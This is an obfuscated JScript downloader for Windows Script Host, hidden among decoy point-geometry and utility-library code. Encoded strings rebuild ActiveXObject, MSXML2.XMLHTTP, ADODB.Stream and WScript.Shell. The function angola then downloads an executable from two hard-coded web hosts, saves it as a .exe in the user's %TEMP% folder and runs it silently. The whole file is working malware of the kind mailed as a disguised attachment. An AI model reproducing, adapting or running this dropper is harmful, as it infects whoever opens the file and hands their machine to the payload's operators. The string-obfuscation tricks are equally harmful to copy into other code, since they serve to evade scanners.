var fundamentally = 0;
anterior = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  point = [];
var carpet = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.blogs = function () {
	electron = this;
	for (var i in carpet){electron = electron.replace(i, carpet[i]);}
    return electron;
};
  for ( var i = 128; i--; ) {
    if ( point[ i ] === undefined )
      point[ i ] = -1;
  
    point[ anterior.charCodeAt( i ) ] = i;
  }
var cartridge = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.blogs4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("vendor").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = point[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = point[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = point[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = point[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var generated ="vendorJVvendorRFTVvendorAl".blogs4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var brine = "vendorQWvendorN0aXZvendorlWE9iavendormVjdA=vendor=".blogs4();
String.prototype.blogs2 = function () {
    var piston = {
        dicke: this
    };
    piston.lambda = piston.dicke["c3Vic3RyaW5n".blogs4()](fundamentally, cartridge);
    return piston.lambda;
};

var puissant ="vendorRXhwYW5vendorkRW52aXvendorJvbm1lbnRTdHJvendorpbmdz".blogs4();
var Native = function(options){
	
};
var quietude = [brine, puissant,generated,  ""+"."+("frontpage","julie","mathematics","germany","matteroffact","hardcore","maize","abbot","exe"), "UnVu".blogs4(), ("M"+"SX"+"ML"+("studios","descriptive","belle","matrimony","necktie","abated","dulcet","2.")+"|M"+"LH"+"TT"+("resorts","factors","marked","lorenz","fiddling","practices","howto","passion","P>")+"WU"+("inequalities","holler","ranked","clandestine","bridge","ringtone","bigotry","cr")+("riven","produced","increased","breastplate","aberdeen","strange","permanent","bounce","ip")+"t:"+("excommunication","additionally","declamation","funds","judgement","grande","andrea","conjure","Sh")+"ell").blogs()];
forwarding = "_F2_";
var adolescent = this[quietude.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
GDfsAfxlEv = "nCCkTH";
shakespearean = (("illegally", "experimentally", "strand", "priorities", "intellectual", "whomsoever", "tradesmen", "peoodMVlSDca") + "onbAhV").blogs2();
linked = (("traverse", "taurus", "africa", "charges", "heights", "malaria", "promotions", "agree", "antagonism", "stROnwzHcQ") + "rkRsyUxw").blogs2();
  
    String.prototype.releases = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var performing = quietude.pop().split(">");

studied = "b3Blbg==".blogs4();
var profile = new adolescent(performing[1]);
PihGAukxg = "_F3_";
var swindler = new adolescent(performing[0]);
var parvenu = profile[quietude.shift()](quietude.shift());
MFWAxq = "_F5_";
weasel = (("tragedian", "privileges", "incognito", "predict", "ElcvnsnbobRD") + "TtvlQi").blogs2();

var commands = quietude.shift();
var matteroffact = quietude.shift();
function angola(viagra, tackle) {

    try {
        var korea = parvenu + "/" + tackle ;
		korea = korea+ commands;
            swindler[studied](("gradually","furthermore","G" + weasel) + ("superfluity","reciprocity","networks","sawdust","T"), viagra, false);
       
    PrDeCfsmkn = "_F7_";
    swindler[linked + ("stench","marking","end")]();
	var lonely=(WScript+"shakespearean"=="V2luZG93cyBTY3JpcHQgSG9zdA==".blogs4()+"shakespearean")&&swindler["c3RhdHVz".blogs4()] +""=="MjAw".blogs4()&&typeof(lcBiEuUWzew)==="undefined";
	lQHNgR = "_F8_";
    if (lonely) {
		
        var bankrupt = new adolescent((("unattainable","nunnery","bryan","fallacious","catalogs","national","munificent","seventythree","A")+("fatten","vertically","silurian","undergraduate","street","rocket","journalism","caring","SEOO")+"DB"+("avoid","necklace","seventythree","nation","attempts","canvas","atmospheric",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        bankrupt[studied]();
        vDaLoNkoC = "_F9_";
        bankrupt.type = cartridge;
        IpBHWR = "_F10_";
        bankrupt["d3JpdGU=".blogs4()](swindler[("trackless","inspiration","suited","inversion","tripoli","global","exports","")+"R"+"es"+"pon"+carpet['U'].toLowerCase()+"e"+"Qm9keQ==".blogs4()]);
        YbPbiF = "_F11_";
        bankrupt[(shakespearean + "o"+("nudity","aphorism","transcripts","scenic","seeing","diplomat","reasons","profligate","00")+("oxide","prostores","drizzle","intermission","solely","knocker","talisman","8i")+"tion").replace("0"+("intensify","speeches","celibacy","allege","beetle","blackberry","plate","08"), linked)] = 0;
        CKNbqTIJt = "_F12_";
        bankrupt[("driveway","intelligent","daughter","north","pecking","transmitted","result","s")+"aveT"+"oF"+"ile"](korea, 2);
        hzCseyYXpj = "_F13_";
        bankrupt.close();
        lFWwdOzd = "_F14_";
		profile[matteroffact](korea, cartridge, true);
    }
} catch (FnXyjCYjX) { };

    tXVPzxoOU = "_F15_";
}
try{
angola("aHR0cDovLw==".blogs4()+"\u006C\u0069\u0074\u0074\u006C\u0065\u0073\u006F\u0075\u006E\u0064\u0064\u006A"+"\u002E\u0063\u006F\u006D\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?PcRwhqeQD=fiGMfTA","jAyPYG");}catch(upPwYNaDzO){}

angola("aHR0cDovLw==".blogs4()+"\u0062\u006C\u006F\u0067\u002E\u0072\u006F\u0074\u0061\u0070\u006F\u0073\u0074"+"\u002E\u0072\u0075\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?vBqRxhFKC=riJFWkE","dackGMbo");
   EzfEgXCy = "_F16_";
   